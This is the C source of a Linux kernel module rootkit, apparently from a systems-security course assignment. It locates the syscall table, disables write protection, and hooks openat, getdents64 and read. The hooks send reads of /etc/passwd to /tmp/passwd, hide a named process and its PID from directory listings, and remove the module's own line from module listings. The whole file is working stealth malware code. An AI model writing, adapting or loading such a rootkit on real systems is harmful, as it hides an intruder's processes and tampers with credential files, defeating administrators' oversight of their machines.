#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/dirent.h>   // for getdents64
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"
#define PREFIX_MOD "sneaky_mod"
// declare sneaky_process pid
static char *sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "sneaky_process pid");

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int (*original_read)(struct pt_regs *);
// Define your new sneaky version of the 'openat' syscall

asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    // Implement the sneaky part here
    // You need to check if the process is trying to open the /etc/passwd file
    // If so, redirect it to your /tmp/passwd file instead
    // You may need to use the ‘copy_to_user’ function to redirect the file pointer
    const char *pathname = (char *)regs->si;  // https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    if (strcmp(pathname, "/etc/passwd") == 0) {
        copy_to_user((char *)pathname, "/tmp/passwd", 11);
    }
    return (*original_openat)(regs);
}

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
    struct linux_dirent64 *original_dirp = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *curr_dirp = original_dirp;
    long bytes_read = original_getdents64(regs);
    long offset = 0;
    if (bytes_read < 0) {
        return bytes_read;
    }
    while (offset < bytes_read) {
        if ((strcmp(curr_dirp->d_name, PREFIX) == 0) || (strcmp(curr_dirp->d_name, sneaky_pid) == 0)) {
            memmove(curr_dirp, (char *)curr_dirp + curr_dirp->d_reclen, (long)original_dirp + bytes_read - (long)curr_dirp - curr_dirp->d_reclen);
            bytes_read -= curr_dirp->d_reclen;
            continue;
        }
        offset += curr_dirp->d_reclen;
        curr_dirp = (struct linux_dirent64 *)((char *)curr_dirp + curr_dirp->d_reclen);
    }
    return bytes_read;
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
    void *original_buf = (char *)regs->si;
    ssize_t bytes_read = (ssize_t)original_read(regs);
    if (bytes_read <= 0) {
        return bytes_read;
    }
    void *curr_line = strstr(original_buf, PREFIX_MOD);
    if (curr_line != NULL) {
        // found the sneaky_mod line
        // remove it by memmove
        void *next_line = strstr(curr_line, "\n");
        if (next_line != NULL) {
            // memmove(curr_line, next_line + 1, original_buf + bytes_read - next_line - 1);
            memmove(curr_line, next_line + 1, bytes_read - (curr_line - original_buf) - (next_line - curr_line + 1));
            bytes_read -= (ssize_t)(next_line + 1 - curr_line);
        }
    }
    return bytes_read;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *)sys_call_table[__NR_openat];
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_read = (void *)sys_call_table[__NR_read];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
    sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

    // You need to replace other system calls you need to hack here

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);

    return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_read] = (unsigned long)original_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
MODULE_AUTHOR("zx106");
MODULE_DESCRIPTION("A simple Linux module for hiding a sneaky process.");
